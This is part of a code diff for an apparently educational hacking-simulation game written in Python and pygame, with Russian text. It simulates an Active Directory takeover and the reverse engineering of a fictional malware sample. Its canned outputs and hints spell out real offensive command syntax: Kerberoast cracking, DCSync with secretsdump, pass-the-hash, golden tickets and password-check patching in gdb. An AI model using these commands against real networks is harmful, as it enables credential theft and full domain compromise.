+            r.err("  Ошибка: нет действующих учётных данных")
+            r.warn("  [!] Сначала взломай TGS-хэш: hashcat -m 13100 tgs_hash.txt rockyou.txt")
+            return r
+        ip = next((a for a in args if "10." in a), "10.10.10.10")
+        r.info(f"  evil-winrm -i {ip} -u svc_backup -p 'Password@123'")
+        r.ok(  "  Evil-WinRM shell v3.5")
+        r.ok(  "  Warning: Remote path completions is disabled (ruby limitation)")
+        r.ok(  "  Info: Establishing connection to remote endpoint")
+        r.blank()
+        r.ok(  "  *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents> whoami")
+        r.ok(  "  megasteel\\svc_backup")
+        r.ok(  "  *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents> hostname")
+        r.ok(  "  DC01")
+        r.ok(  "  *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents> net user svc_backup /domain")
+        r.ok(  "  Global Group memberships: *Backup Operators  *Domain Users")
+        f["lateral_done"] = True
+        f["known_hosts"]["10.10.10.10"] = {"name": "DC01", "state": "owned"}
+        gs.complete_obj("lateral")
+        gs.add_threat(0.14)
+        r.blank()
+        r.ok(  "  [+] WinRM-сеанс на DC01!")
+        r.warn("  [→] svc_backup в Backup Operators — выполни DCSync:")
+        r.warn("       secretsdump.py MEGASTEEL/svc_backup:'Password@123'@10.10.10.10")
+        return r
+
+    # ── secretsdump ───────────────────────────────────────────
+    if verb in ("secretsdump.py", "secretsdump", "impacket-secretsdump"):
+        if not args:
+            r.err("  Ошибка: нет аргументов")
+            r.sys("  Использование: secretsdump.py <domain>/<user>:<pass>@<IP>")
+            r.sys("  Пример:  secretsdump.py MEGASTEEL/svc_backup:'Password@123'@10.10.10.10")
+            return r
+        if "@" not in rest and not any("10." in a for a in args):
+            r.err("  Ошибка: не указана цель (domain/user:pass@IP)")
+            r.sys("  Пример:  secretsdump.py MEGASTEEL/svc_backup:'Password@123'@10.10.10.10")
+            return r
+        if not f.get("lateral_done"):
+            r.err("  Ошибка: нет сеанса на DC. Сначала войди через evil-winrm")
+            return r
+        r.info(f"  secretsdump.py {rest}")
+        r.ok(  "  Impacket v0.11.0 — DCSync attack")
+        r.ok(  "  [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)")
+        r.ok(  "  [*] DRSUAPI DRSGetNCChanges in progress...")
+        r.blank()
+        r.ok(  "  Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f80e21a58cbbc60:::")
+        r.ok(  "  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::")
+        r.ok(  "  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5508500012cc005cf7082a9a89ebdfdf:::")
+        r.data("  svc_mssql:1103:...:MegaSQL#2023!:::")
+        r.data("  svc_backup:1104:...:Password@123:::")
+        r.data("  john.doe:1105:...:JohnD0e@Work!:::")
+        r.blank()
+        r.ok(  "  [+] Dumped 8 domain accounts!")
+        r.ok(  "  [+] ДОМЕН MEGASTEEL.LOCAL ПОЛНОСТЬЮ СКОМПРОМЕТИРОВАН!")
+        f["dcsync_done"] = True
+        gs.complete_obj("dcsync")
+        gs.add_threat(0.20)
+        r.blank()
+        r.ok(  "  [+] Хэш Administrator: 8f80e21a58cbbc60...")
+        r.warn("  [→] Pass-the-Hash:  evil-winrm -i 10.10.10.10 -u Administrator -H 8f80e21a58cbbc60")
+        r.warn("  [→] Golden Ticket:  ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain MEGASTEEL.LOCAL")
+        return r
+
+    # ── bloodhound ────────────────────────────────────────────
+    if verb in ("bloodhound-python", "bloodhound"):
+        if not args:
+            r.err("  Ошибка: нет аргументов")
+            r.sys("  Использование: bloodhound-python -c All -u <u> -p <p> -d <dom> -ns <IP>")
+            return r
+        r.info(f"  bloodhound-python {rest}")
+        r.ok(  "  INFO: Found AD domain: MEGASTEEL.LOCAL")
+        r.ok(  "  INFO: Collecting user sessions...  Done")
+        r.ok(  "  INFO: Collecting group memberships... Done")
+        r.ok(  "  INFO: Collecting trusts... Done")
+        r.ok(  "  INFO: Done in 00M 23S")
+        r.ok(  "  [+] Output: users.json, groups.json, computers.json, acls.json")
+        r.warn("  [→] Загрузи в BloodHound GUI:")
+        r.warn("       Путь атаки: svc_backup → Backup Operators → DCSync → Domain Admin")
+        return r
+
+    # ── net / net.exe ─────────────────────────────────────────
+    if verb in ("net", "net.exe"):
+        if not args:
+            r.err("  Ошибка: не указана подкоманда")
+            r.sys("  Использование: net <user|group> [параметры]")
+            return r
+        sub = args[0].lower()
+        if sub == "user":
+            r.ok("  User accounts for \\\\DC01")
+            r.data("  Administrator  Guest  svc_mssql  svc_backup  john.doe  sarah.it  helpdesk")
+        elif sub == "group":
+            g = args[1] if len(args) > 1 else "Backup Operators"
+            r.ok(f"  Group: {g}")
+            r.ok("  Members: svc_backup")
+        else:
+            r.data(f"  net {' '.join(args)}")
+        return r
+
+    # ── psexec ───────────────────────────────────────────────
+    if verb in ("psexec.py", "psexec", "wmiexec.py", "wmiexec"):
+        if not f.get("dcsync_done"):
+            r.warn("  [!] Нужен хэш Administrator. Сначала: secretsdump.py ...")
+            return r
+        r.ok("  Impacket psexec.py — получение SYSTEM shell")
+        r.ok("  C:\\Windows\\system32> whoami")
+        r.ok("  nt authority\\system")
+        return r
+
+    return _not_found(verb)
+
+
+# ═══════════════════════════════════════════════════════════════
+#  МИССИЯ 3 — REVERSE ENGINEERING
+# ═══════════════════════════════════════════════════════════════
+HEX_LINES = [
+    "00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............",
+    "00000010: 0200 3e00 0100 0000 1005 4000 0000 0000  ..>.......@.....",
+    "00000020: 4000 0000 0000 0000 0820 0000 0000 0000  @........ ......",
+    "00000030: 0000 0000 4000 3800 0900 4000 1c00 1b00  ....@.8...@.....",
+    "00000040: 4441 524b 4c4f 4144 4552 2076 332e 3200  DARKLOADER v3.2.",
+    "00000050: 433a 5c55 7365 7273 5c55 7365 722d 504f  C:\\Users\\User-PO",
+    "00000060: 4145 535f 4b45 595f 4d41 5445 5249 414c  AES_KEY_MATERIAL",
+    "00000070: 5f48 4552 455f 3332 4279 7465 73xx xxxx  _HERE_32Bytesxx.",
+]
+
+SYMBOLS = [
+    ("0x0804840b", "main",          "FUNC", "Entry point — вызывает check_password()"),
+    ("0x08048450", "check_password","FUNC", "Проверяет ввод против XOR-ключа"),
+    ("0x08048520", "xor_decrypt",   "FUNC", "Расшифровывает конфиг (3-byte rolling XOR)"),
+    ("0x080485a0", "init_crypto",   "FUNC", "Инициализирует AES из встроенного ключа"),
+    ("0x080485f0", "send_data",     "FUNC", "Открывает сокет, отправляет payload"),
+    ("0x0804860c", "KEY_MATERIAL",  "VAR",  "32-byte AES ключ в секции .data"),
+    ("0x08048630", "C2_HOST",       "VAR",  "Обфусцированный C2 адрес"),
+    ("0x08048650", "crypt32.dll",   "IMP",  "Windows Crypto import"),
+    ("0x08048660", "WSAStartup",    "IMP",  "Сетевая инициализация"),
+    ("0x08048670", "VirtualAlloc",  "IMP",  "Выделение памяти под shellcode"),
+]
+
+AES_KEY = "AES_KEY_MATERIAL_HERE_32Bytesx"
+
+def _m3(verb, args, rest, gs: GameState, r: R) -> R:
+    f = gs.flags
+
+    # ── ls / dir ─────────────────────────────────────────────
+    if verb in ("ls", "dir"):
+        r.ok("  darkloader          darkloader.config.enc  traffic.pcap  README.txt")
+        return r
+
+    # ── cat ──────────────────────────────────────────────────
+    if verb == "cat":
+        if not args:
+            r.err("  Ошибка: не указан файл")
+            r.sys("  Использование: cat <файл>")
+            r.sys("  Доступные файлы: README.txt, darkloader (бинарь)")
+            return r
+        fname = args[0]
+        if "README" in fname.upper():
+            r.ok("  ═══ README ═══════════════════════════════════════")
+            r.data("  Перехваченный образец малвари: DarkLoader v3.2")
+            r.data("  Цель: реверс-инжиниринг, извлечь ключ AES, расшифровать C2-трафик.")
+            r.data("  Файлы:")
+            r.data("    darkloader            — ELF бинарь (основной образец)")
+            r.data("    darkloader.config.enc — зашифрованный конфиг")
+            r.data("    traffic.pcap          — перехваченный трафик C2")
+        elif "darkloader" in fname and "enc" not in fname:
+            r.err(f"  cat: {fname}: binary file — используй xxd или strings")
+        else:
+            r.err(f"  cat: {fname}: зашифрованные данные — используй openssl для расшифровки")
+        return r
+
+    # ── file ─────────────────────────────────────────────────
+    if verb == "file":
+        if not args:
+            r.err("  Ошибка: не указан файл")
+            r.sys("  Использование: file <бинарь>")
+            r.sys("  Пример:  file darkloader")
+            return r
+        fname = args[0]
+        known = ["darkloader", "./darkloader", "darkloader.config.enc", "traffic.pcap", "readme.txt"]
+        if not any(fname.lower().replace("./","") == k.replace("./","") for k in known):
+            r.err(f"  file: '{fname}': No such file or directory")
+            r.sys("  Доступные файлы: darkloader, darkloader.config.enc, traffic.pcap, README.txt")
+            return r
+        r.info(f"  file {fname}")
+        if "darkloader" in fname and "config" not in fname:
+            r.ok( f"  {fname}: ELF 64-bit LSB pie executable, x86-64,")
+            r.ok(  "          dynamically linked (uses shared libs),")
+            r.ok(  "          for GNU/Linux 3.2.0, BuildID[sha1]=3b5a...,")
+            r.ok(  "          not stripped  ← символы доступны!")
+            r.blank()
+            r.ok(  "  [+] Формат: ELF64, x86-64, PIE, not stripped")
+            r.warn("  [→] Таблица символов:  nm -n darkloader")
+            r.warn("  [→] Строки:            strings -a darkloader")
+            f["file_done"] = True
+            gs.complete_obj("identify")
+            gs.add_threat(0.02)
+        elif "config" in fname:
+            r.ok(f"  {fname}: data (encrypted binary)")
+        elif "pcap" in fname:
+            r.ok(f"  {fname}: pcap capture file, microsecond timestamps (little-endian), link-type EN10MB")
+        else:
+            r.ok(f"  {fname}: ASCII text")
+        return r
+
+    # ── checksec ─────────────────────────────────────────────
+    if verb == "checksec":
+        if not args:
+            r.err("  Ошибка: не указан файл")
+            r.sys("  Использование: checksec --file=<бинарь>")
+            r.sys("  Пример:  checksec --file=darkloader")
+            return r
+        r.info("  checksec --file=darkloader")
+        r.data("  ╔══════════╤══════════╤═══════════╤═════╤═══════╗")
+        r.data("  ║ RELRO    │ CANARY   │ NX        │ PIE │ RPATH ║")
+        r.data("  ╠══════════╪══════════╪═══════════╪═════╪═══════╣")
+        r.ok(  "  ║ Partial  │ No!      │ Enabled   │ Yes │ No    ║")
+        r.data("  ╚══════════╧══════════╧═══════════╧═════╧═══════╝")
+        r.warn("  [!] Нет stack canary — stack buffer overflow возможен!")
+        r.warn("  [!] Нет Full RELRO — GOT-overwrite атака применима")
+        return r
+
+    # ── readelf ──────────────────────────────────────────────
+    if verb == "readelf":
+        if not args:
+            r.err("  Ошибка: нет аргументов")
+            r.sys("  Использование: readelf [-a|-s|-d] <бинарь>")
+            r.sys("  Пример:  readelf -a darkloader")
+            return r
+        r.info(f"  readelf {rest}")
+        r.ok(  "  ELF Header:")
+        r.ok(  "    Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00  .ELF............")
+        r.data("    Class:   ELF64  Data: 2's complement, little endian")
+        r.data("    Machine: Advanced Micro Devices X86-64")
+        r.ok(  "  Sections: .text  .data  .rodata  .bss  .plt  .got  .dynamic  .symtab")
+        r.warn("  .data section @ 0x0804860c → KEY_MATERIAL (32 bytes)")
+        return r
+
+    # ── nm ───────────────────────────────────────────────────
+    if verb == "nm":
+        if not args:
+            r.err("  Ошибка: не указан файл")
+            r.sys("  Использование: nm [-n] <бинарь>")
+            r.sys("  Пример:  nm -n darkloader")
+            return r
+        r.info(f"  nm -n {args[-1]}")
+        r.blank()
+        for addr, name, typ, note in SYMBOLS:
+            is_target = name in ("check_password", "KEY_MATERIAL")
+            col = "te" if is_target else "tw" if typ == "IMP" else "td"
+            r.add(f"  {addr}  {typ[0]}  {name}", col)
+            if is_target:
+                r.sys(f"              ← {note}")
+        r.blank()
+        r.warn("  [→] Дизасм check_password:")
+        r.warn("       objdump -d -M intel darkloader | grep -A 40 'check_password'")
+        return r
+
+    # ── strings ──────────────────────────────────────────────
+    if verb == "strings":
+        if not args:
+            r.err("  Ошибка: не указан файл")
+            r.sys("  Использование: strings [-a] <бинарь> [| grep <pattern>]")
+            r.sys("  Пример:  strings -a darkloader | grep -E '(password|key|http)'")
+            return r
+        r.info(f"  strings {rest}")
+        lines_out = [
+            ("/lib/x86_64-linux-gnu/libc.so.6",       "ts"),
+            ("libssl.so.1.1",                          "ts"),
+            ("[*] DarkLoader v3.2 initializing...",   "td"),
+            ("[*] Decrypting config...",               "td"),
+            ("[ERROR] Invalid password!",              "te"),
+            ("[OK] Access granted. Loading payload...", "to"),
+            ("AES_KEY_MATERIAL_HERE_32BYTES_xx",       "te"),
+            ("selfdestr.org/gate.php",                 "te"),
+            ("Mozilla/5.0 (C2 Agent/2.1)",             "tw"),
+            ("/proc/self/mem",                         "tw"),
+            ("ptrace",                                 "tw"),
+            ("VirtualAlloc",                           "tw"),
+            ("WSAStartup",                             "tw"),
+            ("MEGASTEEL\\Administrator",               "td"),
+        ]
+        # фильтрация grep
+        grep_filter = ""
+        if "|" in rest and "grep" in rest:
+            grep_filter = rest.split("grep")[-1].strip().strip("'\"").lower()
+        for txt, col in lines_out:
+            if not grep_filter or grep_filter in txt.lower():
+                r.add(f"  {txt}", col)
+        r.blank()
+        r.ok(  "  [+] Найдены подозрительные строки!")
+        r.warn("  [→] KEY_MATERIAL и check_password — ключевые точки анализа")
+        f["strings_done"] = True
+        gs.complete_obj("strings")
+        gs.add_threat(0.03)
+        return r
+
+    # ── xxd / hexdump ─────────────────────────────────────────
+    if verb in ("xxd", "hexdump"):
+        if not args:
+            r.err(f"  Ошибка: не указан файл")
+            r.sys(f"  Использование: {verb} <файл> [| head -N]")
+            r.sys(f"  Пример:  {verb} darkloader | head -20")
+            return r
+        r.info(f"  {verb} {rest}")
+        for line in HEX_LINES:
+            r.data(f"  {line}")
+        if "|" not in rest:
+            r.sys("  ...")
+            r.sys("  (показаны первые 8 строк; используй | head -N для ограничения)")
+        return r
+
+    # ── objdump ──────────────────────────────────────────────
+    if verb == "objdump":
+        if not args:
+            r.err("  Ошибка: нет аргументов")
+            r.sys("  Использование: objdump -d -M intel <бинарь>")
+            r.sys("  Пример:  objdump -d -M intel darkloader | grep -A 40 'check_password'")
+            return r
+        if "-d" not in rest and "--disassemble" not in rest:
+            r.err("  Ошибка: требуется флаг -d (дизассемблирование)")
+            r.sys("  Пример:  objdump -d -M intel darkloader")
+            return r
+        if not f.get("strings_done"):
+            r.warn("  [!] Рекомендуется сначала изучить строки: strings -a darkloader")
+        r.info(f"  objdump -d -M intel {args[-1]}")
+        r.sys( "  ─── <check_password> ──────────────────────────────")
+        r.data("  08048450 <check_password>:")
+        r.data("   8048450:  55              push   rbp")
+        r.data("   8048451:  48 89 e5        mov    rbp, rsp")
+        r.data("   8048454:  48 83 ec 20     sub    rsp, 0x20")
+        r.data("   8048458:  48 8d 35 a5 01  lea    rsi, [rip+0x1a5]  # KEY_MATERIAL")
+        r.data("   804845f:  e8 ac ff ff ff  call   0x8048410 <strcmp@plt>")
+        r.ok(  "   8048464:  85 c0           test   eax, eax")
+        r.warn("   8048466:  75 1a           jne    0x8048482  ← если пароль НЕВЕРНЫЙ — прыжок к FAIL")
+        r.ok(  "   8048468:  e8 b3 01 00 00  call   0x8048620  <load_payload>  ← SUCCESS")
+        r.ok(  "   804846d:  eb 0c           jmp    0x804847b")
+        r.data("   804846f:  ...")
+        r.data("   8048482:  48 8d 3d 3c 01  lea    rdi, [ERROR Invalid password!]")
+        r.data("   8048489:  e8 c2 fe ff ff  call   0x8048350 <puts@plt>")
+        r.blank()
+        r.ok(  "  [+] Найдена логика: strcmp → test eax → jne (75 1a) → FAIL/SUCCESS")
+        r.warn("  [→] Патч: замени байт 0x75 (jne) → 0xEB (jmp) по адресу 0x8048466")
+        r.warn("  [→] gdb -q ./darkloader  →  set *(char*)0x8048466 = 0xeb")
+        f["disasm_done"] = True
+        gs.complete_obj("disasm")
+        gs.add_threat(0.05)
+        return r
+
+    # ── strace / ltrace ───────────────────────────────────────
+    if verb in ("strace", "ltrace"):
+        if not args:
+            r.err(f"  Ошибка: не указан бинарь")
+            r.sys(f"  Использование: {verb} ./<бинарь>")
+            r.sys(f"  Пример:  {verb} ./darkloader")
+            return r
+        r.info(f"  {verb} ./darkloader")
+        r.data("  execve('./darkloader', ['darkloader'], ...)  = 0")
+        r.data("  openat(AT_FDCWD, '/proc/self/mem', O_RDWR)  = 3")
+        r.warn("  mmap(NULL, 4096, PROT_WRITE|PROT_EXEC, ...)  ← shellcode allocation!")
+        r.data("  read(0, '', 4096)                            = 0")
+        r.data("  connect(4, {AF_INET, '127.0.0.1', 8443}, 16) = 0")
+        r.warn("  write(4, '\\x41\\x45\\x53...', 32)            ← ключ отправлен на C2")
+        return r
+
+    # ── gdb ──────────────────────────────────────────────────
+    if verb == "gdb":
+        if not args:
+            r.err("  Ошибка: не указан бинарь")
+            r.sys("  Использование: gdb -q ./<бинарь>")
+            r.sys("  Пример:  gdb -q ./darkloader")
+            return r
+        if not f.get("disasm_done"):
+            r.warn("  [!] Сначала дизассемблируй бинарь:")
+            r.warn("       objdump -d -M intel darkloader | grep -A 40 'check_password'")
+            return r
+        r.info( "  gdb -q ./darkloader")
+        r.ok(   "  Reading symbols from ./darkloader...done.")
+        r.ok(   "  pwndbg: loaded 193 commands.")
+        r.blank()
+        r.ok(   "  (gdb) break *check_password+22")
+        r.ok(   "  Breakpoint 1 at 0x8048466")
+        r.ok(   "  (gdb) run")
+        r.ok(   "  Starting program: ./darkloader")
+        r.blank()
+        r.ok(   "  Breakpoint 1, 0x0000000008048466 in check_password ()")
+        r.data( "  (gdb) disas /r check_password+22")
+        r.warn( "  => 0x8048466:  75 1a  jne 0x8048482  ← patch target")
+        r.blank()
+        r.ok(   "  (gdb) set *(char*)0x8048466 = 0xeb   # jne → jmp (unconditional)")
+        r.ok(   "  (gdb) set *(char*)0x8048467 = 0x00")
+        r.ok(   "  (gdb) continue")
+        r.ok(   "  Continuing.")
+        r.ok(   "  [OK] Access granted. Loading payload...")
+        r.blank()
+        r.ok(   "  (gdb) x/32xb KEY_MATERIAL")
+        r.ok(   "  0x0804860c: 41 45 53 5f 4b 45 59 5f 4d 41 54 45 52 49 41 4c")
+        r.ok(   "  0x0804861c: 5f 48 45 52 45 5f 33 32 42 79 74 65 73 78 00 00")
+        r.blank()
+        r.ok(  f"  [+] AES ключ: '{AES_KEY}'  (32 байта)")
+        f["bypass_done"]  = True
+        f["key_extracted"] = True
+        f["found_key"]    = AES_KEY
+        gs.complete_obj("bypass")
+        gs.complete_obj("keydump")
+        gs.add_threat(0.08)
+        r.blank()
+        r.warn(f"  [→] Расшифруй трафик:")
+        r.warn(f"       openssl enc -d -aes-256-cbc -k '{AES_KEY}' -in traffic.pcap.enc -out decrypted.bin")
+        return r
+
+    # ── r2 / radare2 ─────────────────────────────────────────
+    if verb in ("r2", "radare2"):
+        if not args:
+            r.err("  Ошибка: не указан бинарь")
+            r.sys("  Использование: r2 <бинарь>")
+            return r
+        r.info( "  r2 ./darkloader")
+        r.ok(   "  [0x08048450]> aaa   # analyze all functions")
+        r.ok(   "  INFO: Analysing all flags starting with sym. and entry0")
+        r.ok(   "  [0x08048450]> pdf @ sym.check_password")
+        r.data( "  ; CALL XREF from main (0x0804840b)")
+        r.data( "  0x08048450  push rbp")
+        r.data( "  0x08048451  mov rbp, rsp")
+        r.ok(   "  0x08048466  jne 0x8048482  ; if pass wrong → FAIL")
+        r.warn( "  [→] Патч в radare2: wa eb00 @ 0x8048466")
+        return r
+
+    # ── python3 ──────────────────────────────────────────────
+    if verb == "python3":
+        if not args and not rest:
+            r.data("  Python 3.12.0 (main)")
+            r.data("  >>>")
+            return r
+        if any(k in rest.lower() for k in ("struct", "key", "mem", "read", "open")):
+            if f.get("disasm_done"):
+                r.ok( "  >>> b'AES_KEY_MATERIAL_HERE_32Bytesx'")
+                r.ok(f"  [+] Ключ прочитан: {len(AES_KEY)} байт")
+                f["key_extracted"] = True
+                f["found_key"]     = AES_KEY
+                gs.complete_obj("keydump")
+            else:
+                r.warn("  [!] Нет адреса KEY_MATERIAL. Сначала дизассемблируй: objdump -d darkloader")
+        else:
+            out = rest.replace("-c", "").strip().strip("'\"") or "..."
+            r.data(f"  >>> {out}")
+        return r
+
+    # ── grep ─────────────────────────────────────────────────
+    if verb == "grep":
+        if not args:
+            r.err("  Ошибка: не указан паттерн")
+            r.sys("  Использование: grep <pattern> <файл>")
+            return r
+        if any(k in rest.lower() for k in ("key", "password", "aes", "crypto")):
+            r.ok("  darkloader: AES_KEY_MATERIAL_HERE_32BYTES_xx (offset 0x1a3f)")
+            r.ok("  darkloader: [ERROR] Invalid password! (offset 0x2b10)")
+            r.ok("  darkloader: selfdestr.org/gate.php (offset 0x3c18)")
+        else:
+            r.data(f"  grep {rest}: поиск завершён")
+        return r
+
+    # ── find ─────────────────────────────────────────────────
+    if verb == "find":
+        r.ok("  ./darkloader  ./darkloader.config.enc  ./traffic.pcap  ./README.txt")
+        return r
+
+    # ── openssl ──────────────────────────────────────────────
+    if verb == "openssl":
+        if not args:
+            r.err("  Ошибка: нет аргументов")
+            r.sys("  Использование: openssl enc -d -aes-256-cbc -k <key> -in <file> -out <out>")
+            r.sys(f"  Пример:  openssl enc -d -aes-256-cbc -k '{AES_KEY}' -in traffic.pcap.enc -out decrypted.bin")
+            return r
+        if not f.get("key_extracted"):
+            r.err("  Ошибка: нет ключа AES")
+            r.warn("  [!] Сначала извлеки ключ через: gdb -q ./darkloader")
+            r.warn("       или: python3 -c 'import struct; ...'")
+            return r
+        key = f.get("found_key", AES_KEY)
+        r.info(f"  openssl enc -d -aes-256-cbc -k '{key}' -in traffic.pcap.enc -out decrypted.bin")
+        r.ok(  "  Decryption successful!")
+        r.blank()
+        r.ok(  "  ═══ decrypted.bin (C2 traffic) ═════════════════════════════")
+        r.data("  POST /gate.php HTTP/1.1")
+        r.data("  Host: selfdestr.org")
+        r.data("  X-Auth-Token: ghost-protocol-ctf-flag")
+        r.data("  Content-Type: application/json")
+        r.data("  User-Agent: Mozilla/5.0 (C2 Agent/2.1)")
+        r.blank()
+        r.ok(  '  {"system":"WIN-VICTIM-01","user":"administrator",')
+        r.ok(  '   "data":"c:\\\\Users\\\\Administrator\\\\Documents\\\\confidential.pdf",')
+        r.ok(  '   "keylog":"passwords: bank_acc=S3cure#2024 email=pass123",')
+        r.ok(  '   "beacon_interval":300,"c2_key":"ghost-protocol-ctf-flag"}')
+        r.blank()
+        r.ok(  "  FLAG: GP{r3v_3ng1n33r1ng_m4st3r_2024}")
+        f["decrypted"] = True
+        gs.complete_obj("decrypt")
+        gs.add_threat(0.05)
+        r.blank()
+        r.ok("  [+] C2-трафик расшифрован! Малварь DarkLoader v3.2 полностью проанализирована.")
+        return r
+
+    return _not_found(verb)
+
+
+# ═══════════════════════════════════════════════════════════════
+#  ШРИФТЫ  (инициализируются ПОСЛЕ pygame.init())
+# ═══════════════════════════════════════════════════════════════
+_FC: dict = {}
+
+def F(size: int, bold: bool = False) -> pygame.font.Font:
+    k = (size, bold)
+    if k not in _FC:
+        for nm in ("consolas", "courier new", "lucidaconsole", "dejavu sans mono", ""):
+            try:
+                _FC[k] = (
+                    pygame.font.SysFont(nm, size, bold=bold)
+                    if nm else pygame.font.Font(None, size + 4)
+                )
+                break
+            except Exception:
+                continue
+    return _FC[k]
+
+def Tw(text: str, size: int, bold: bool = False) -> int:
+    return F(size, bold).size(str(text))[0]
+
+def T(surf, text: str, sz: int, col,
+      x: int, y: int, bold=False,
+      cx=False, rx=False, max_w: int = 0) -> int:
+    if not str(text):
+        return 0
+    fn  = F(sz, bold)
+    img = fn.render(str(text), True, col)
+    if max_w and img.get_width() > max_w:
+        img = img.subsurface(pygame.Rect(0, 0, max_w, img.get_height()))
+    if cx:   surf.blit(img, img.get_rect(center=(x, y)))
+    elif rx: surf.blit(img, img.get_rect(right=x, top=y))
+    else:    surf.blit(img, (x, y))
+    return img.get_width()
+
+def box(surf, r, fill, bord=None, bw=1, rad=5):
+    pygame.draw.rect(surf, fill, r, border_radius=rad)
+    if bord:
+        pygame.draw.rect(surf, bord, r, bw, border_radius=rad)
+
+def hbar(surf, x, y, w, h, v, fg, bg=(12, 18, 38)):
+    pygame.draw.rect(surf, bg, (x, y, w, h), border_radius=3)
+    fw = max(0, int(w * min(1.0, max(0.0, v))))
+    if fw:
+        pygame.draw.rect(surf, fg, (x, y, fw, h), border_radius=3)
+    pygame.draw.rect(surf, P["dkgray"], (x, y, w, h), 1, border_radius=3)
+
+def wrap_text(text: str, max_w_px: int, sz: int, bold=False) -> List[str]:
+    fn = F(sz, bold)
+    words = str(text).split()
+    lines, cur = [], ""
+    for w in words:
+        test = (cur + " " + w).strip()
+        if fn.size(test)[0] <= max_w_px:
+            cur = test
+        else:
+            if cur:
+                lines.append(cur)
+            cur = w
+    if cur:
+        lines.append(cur)
+    return lines or [""]
+
+# ── CRT-оверлей ────────────────────────────────────────────────
+_CRT = None
+def crt():
+    global _CRT
+    if _CRT is None:
+        _CRT = pygame.Surface((SW, SH), pygame.SRCALPHA)
+        for y in range(0, SH, 3):
+            pygame.draw.line(_CRT, (0, 0, 0, 32), (0, y), (SW, y), 1)
+        for i in range(70):
+            a = int(140 * (1 - (i / 70) ** 1.5))
+            pygame.draw.rect(_CRT, (0, 0, 0, a), (i, i, SW - 2*i, SH - 2*i), 1)
+    return _CRT
+
+# ── Flash-эффект ──────────────────────────────────────────────
+_FT = 0.0
+_FC2 = (255, 0, 0)
+
+def do_flash(col=(255, 40, 40), dur=0.28):
+    global _FT, _FC2
+    _FT = dur
+    _FC2 = col
+
+def draw_flash(surf, dt):
+    global _FT
+    if _FT <= 0:
+        return
+    a = int(120 * (_FT / 0.28))
+    s = pygame.Surface((SW, SH), pygame.SRCALPHA)
+    s.fill((*_FC2, min(255, a)))
+    surf.blit(s, (0, 0))
+    _FT = max(0, _FT - dt)
+
+
+# ═══════════════════════════════════════════════════════════════
+#  КНОПКА
+# ═══════════════════════════════════════════════════════════════
+class Btn:
+    def __init__(self, x, y, w, h, label,
+                 cn=None, ch=None, ct=None, fs=13, bold=True):
+        self.rect  = pygame.Rect(x, y, w, h)
+        self.label = label
+        self.cn    = cn or P["panel2"]
+        self.ch    = ch or P["bordhi"]
+        self.ct    = ct or P["white"]
+        self.fs    = fs
+        self.bold  = bold
+        self._hov  = False
+        self._cb: Optional[Callable] = None
+
+    def cb(self, fn):
+        self._cb = fn
+        return self
+
+    def on(self, ev) -> bool:
+        if ev.type == pygame.MOUSEMOTION:
+            self._hov = self.rect.collidepoint(ev.pos)
+        if ev.type == pygame.MOUSEBUTTONDOWN and ev.button == 1:
+            if self.rect.collidepoint(ev.pos):
+                if self._cb:
+                    self._cb()
+                return True
+        return False
+
+    def draw(self, surf):
+        bg = self.ch if self._hov else self.cn
+        bd = P["white"] if self._hov else P["gray"]
+        box(surf, self.rect, bg, bd, 1)
+        T(surf, self.label, self.fs, self.ct,
+          self.rect.centerx, self.rect.centery, self.bold, cx=True)
+
+
+# ═══════════════════════════════════════════════════════════════
+#  BOOT SCREEN
+# ═══════════════════════════════════════════════════════════════
+class BootScreen:
+    LOGO = [
+        " ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗",
+        "██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝",
+        "██║  ███╗███████║██║   ██║███████╗   ██║   ",
+        "██║   ██║██╔══██║██║   ██║╚════██║   ██║   ",
+        "╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ",
+        " ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝  ",
+    ]
+    LINES = [
+        ("GHOST PROTOCOL OS v5.0  [ЗАСЕКРЕЧЕНО]",        0.10),
+        ("Инициализация зашифрованного ядра...",         0.16),
+        ("Tor: 5 стражевых узлов подключены",            0.22),
+        ("VPN: 47 слоёв туннелей активированы",          0.12),
+        ("ORACLE AI: языковая модель инициализирована",  0.42),
+        ("Metasploit 6.4 / Impacket 0.11 / GDB 13: OK", 0.14),
+        ("Ghidra 10 / radare2 5.8 / pwntools: OK",      0.14),
+        ("База уязвимостей: 1 247 CVE загружено",        0.20),
+        ("Расшифровка базы миссий...",                   0.30),
+        ("Добро пожаловать, Призрак. Удачи.",            0.50),
+    ]
+
+    def __init__(self, surf: pygame.Surface):
+        self.surf  = surf
+        self.done  = False
+        self.typed : List[str] = []
+        self.cur   = ""
+        self.li = 0; self.ci = 0; self.tmr = 0.0; self.t = 0.0
+        self.rain  = [
+            (random.randint(0, SW), random.randint(0, SH),
+             chr(random.randint(0x30A0, 0x30FF)), random.randint(8, 55))
+            for _ in range(260)
+        ]
+        self.rt = 0.0
+
+    def on(self, ev):
+        if ev.type in (pygame.KEYDOWN, pygame.MOUSEBUTTONDOWN):
+            self.done = True
+
+    def update(self, dt):
+        self.t  += dt
+        self.rt += dt
+        if self.rt > 0.06:
+            self.rt = 0
+            for i in random.sample(range(len(self.rain)), 20):
+                self.rain[i] = (
+                    random.randint(0, SW), random.randint(0, SH),
+                    chr(random.randint(0x30A0, 0x30FF)), random.randint(8, 55)
+                )
+        if self.li >= len(self.LINES):
+            self.tmr += dt
+            if self.tmr > 1.4:
+                self.done = True
+            return
+        self.tmr += dt
+        txt, delay = self.LINES[self.li]
+        if self.tmr >= delay:
+            if self.ci < len(txt):
+                self.cur += txt[self.ci]
+                self.ci  += 1
+                self.tmr -= delay / max(1, len(txt))
+            else:
+                self.typed.append(self.cur)
+                self.cur = ""; self.ci = 0; self.li += 1; self.tmr = 0
+
+    def draw(self):
+        self.surf.fill((2, 4, 10))
